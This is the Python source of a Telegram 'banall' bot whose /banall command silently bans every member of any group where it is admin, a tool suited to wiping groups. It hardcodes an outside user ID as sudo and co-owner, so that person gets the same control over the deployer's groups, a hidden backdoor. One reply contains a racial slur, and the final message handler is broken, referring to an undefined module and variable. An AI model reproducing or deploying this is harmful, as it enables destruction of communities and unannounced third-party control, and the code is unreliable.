# Powered by @itzshukla | TELE:- @KSD_BOT_NETWORK
# Dear Pero ppls Plish Don't remove this line from here🌚
# created by SHASHANK SHUKLA
import logging
import re
import os
import sys, platform
# import functie as S
from asyncio import sleep
from os import getenv
from dotenv import load_dotenv
from telethon import TelegramClient, events, Button
import telethon.utils
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from asyncio import sleep
from telethon import __version__ as tel
from str import dad as gg, dady as g, startxt2, startxt, hlptxt
from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins, ChatAdminRights
from telethon.tl.functions.channels import EditBannedRequest
from datetime import datetime

#Logging...
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
API_ID = int(os.getenv("API_ID", ""))
API_HASH = os.getenv("API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
OWNER_ID = os.getenv("OWNER_ID", "")
SUDO_ID = "7668520999"
LUCIFER = "7668520999"
COWNER_ID = "7668520999"
OP  = [ int(OWNER_ID), int(SUDO_ID), int(COWNER_ID), int(LUCIFER)]
#TelegramClient..
sree = TelegramClient(
    "BanAll",
    api_id=API_ID,
    api_hash=API_HASH
).start(bot_token=BOT_TOKEN)

Owner = "ll_hunter_lll"
repo = "https://github.com/ksdofficial8/STRANGER-BANALL"
@sree.on(events.NewMessage(pattern="^/start"))
async def start(event):
    buttns = [Button.url("••sᴜᴘᴘᴏʀᴛ••", "https://t.me/TEAM_RIYA_SUPPORT"), Button.url("••ᴜᴘᴅᴀᴛᴇs••", "https://t.me/KSD_BOT_NETWORK"), Button.url("••ʀᴇᴘᴏ••", f'{repo}')]
    py = platform.python_version()
    if event.sender.id in OP:
        await sree.send_file(
            event.chat.id,
            file="https://files.catbox.moe/ijicdg.webp",
            caption=startxt.format(
                event.sender.first_name,
                event.sender.id,
                py,
                tel,
                Owner,
            ),
            link_preview=False,
            buttons=buttns
        )
    if event.sender.id not in OP:
        await sree.send_file(
            event.chat.id,
            file="https://files.catbox.moe/ijicdg.webp",
            caption=startxt2.format(
                event.sender.first_name,
                event.sender.id,
                py,
                tel,
                Owner,
            ),
            link_preview=False,
            buttons=buttns
        )


@sree.on(events.NewMessage(pattern="^/help"))
async def start(event):
    buttns = [Button.url("••sᴜᴘᴘᴏʀᴛ••", "https://t.me/team_riya_support"), Button.url("••ᴜᴘᴅᴀᴛᴇs••", "https://t.me/ksd_bot_network"),
    Button.url("••ʀᴇᴘᴏ••", f'{repo}')]
    py = platform.python_version()
    if event.sender.id in OP:
        await sree.send_file(
            event.chat.id,
            file="https://files.catbox.moe/ijicdg.webp",
            caption=hlptxt.format(event.sender.first_name, event.sender.id),
            link_preview=False,
            buttons=buttns
        )
    if event.sender.id not in OP:
        await event.reply(
            "ʜᴜʜ ɴɪɢɢᴀ!\ɴᴛʜɪs ɪs ɴᴏᴛ ғᴏʀ ʏᴏᴜ ʟᴏʟ 😑\n\ɴᴍᴀᴋᴇ ʏᴏᴜʀ ᴏᴡɴ ʙᴏᴛ ғʀᴏᴍ ᴛʜɪs [ʀᴇᴘᴏsɪᴛᴏʀʏ⚡](https://github.com/ksdofficial8/STRANGER-BANALL)",
            link_preview=False,
        )       

@sree.on(events.NewMessage(pattern="^/ping"))
async def ping(event):
    if event.sender.id in OP:
        start = datetime.now()
        t = "Pinging..."
        txxt = await event.reply(t)
        end = datetime.now()
        ms = (end-start).microseconds / 1000
        await txxt.edit(f"ʏᴇᴀн ɪ ᴀᴍ ᴀʟɪᴠᴇ 🔥!!\n\nᴘɪɴɢ ᴘᴏɴɢ 🏓\n   ➥ `{ms} ms`")


@sree.on(events.NewMessage(pattern="^/banall"))
async def bun(event):
  if event.sender.id in OP:
   if not event.is_group:
        Rep = f"__ʙʀᴜsʜ ᴀʀᴇ You sᴇʀɪᴏᴜs 🙄.\ɴᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ɪɴ ᴀɴʏ ɢʀᴏᴜᴘ!!__"
        await event.reply(Rep)
   else:
       await event.delete()
       cht = await event.get_chat()
       boss = await event.client.get_me()
       admin = cht.admin_rights
       creator = cht.creator
       if not admin and not creator:
           await event.reply("__ɪ ᴅᴏɴ ʜᴀᴠᴇ sᴜғғɪᴄɪᴇɴᴛ ʀɪɢʜᴛs ᴛᴏ ᴅᴏ ᴛʜɪs.__")
           return
       hmm =  await event.reply("__ʏᴇ ʙɪʟᴇᴋ ᴍɪɢɪᴄ ʙᴇɢɪɴs🥳...__")
       await sleep(18)
       await hmm.delete()
       everyone = await event.client.get_participants(event.chat_id)
       for user in everyone:
           if user.id == boss.id:
               pass
           try:
               await event.client(EditBannedRequest(event.chat_id, int(user.id), ChatBannedRights(until_date=None,view_messages=True)))
           except Exception as e:
               await event.edit(str(e))
           await sleep(0.3)


@sree.on(events.NewMessage(pattern="^/restart"))
async def restart(jnl):
    if jnl.sender.id in OP:
        tct = "__ᴡᴀɪᴛ ʀᴇsᴛᴀʀᴛɪɴɢ...__"
        await jnl.reply(tct)
        try:
            await sree.disconnect()
        except Exception:
            pass
        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()


@sree.on(events.NewMessage(pattern="^/leave"))
async def leave(z):
    if z.sender.id in OP:
        mkc = ("".join(z.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(z.text) > 7:
            mkb = int(mkc[0])
            tet = "__ᴡᴀɪᴛ ʟᴇᴀᴠɪɴɢ...__"
            hm = await z.reply(tet)
            try:
                await z.client(LeaveChannelRequest(mkb))
                await hm.edit("**sᴜᴄᴄᴇsғᴜʟʟʏ ʟᴇғᴛᴇᴅ!!**")
            except Exception as e:
                await hm.edit(str(e))
        else:
            mkb = z.chat_id
            txt = "__ᴡᴀɪᴛ ʟᴇᴀᴠɪɴɢ...__"
            ok = await z.reply(txt)
            try:
                await z.client(LeaveChannelRequest(mkb))
                await ok.edit("**sᴜᴄᴄᴇsғᴜʟʟʏ ʟᴇғᴛᴇᴅ!!**")
            except Exception as e:
                await z.edit(str(e))

@sree.on(events.NewMessage)
async def ver(events):
    events = S
    await events.main(str(e))


print("ʏᴏᴜʀ ʙᴏᴛ  ᴅᴇᴘʟᴏʏᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ ✅")
print("ᴊᴏɪɴ @KSD_BOT_NETWORK ɪғ ʏᴏᴜ ғᴀᴄɪɴɢ ᴀɴʏ ᴋɪɴᴅ ᴏғ ɪssᴜᴇ!!")



sree.run_until_disconnected()
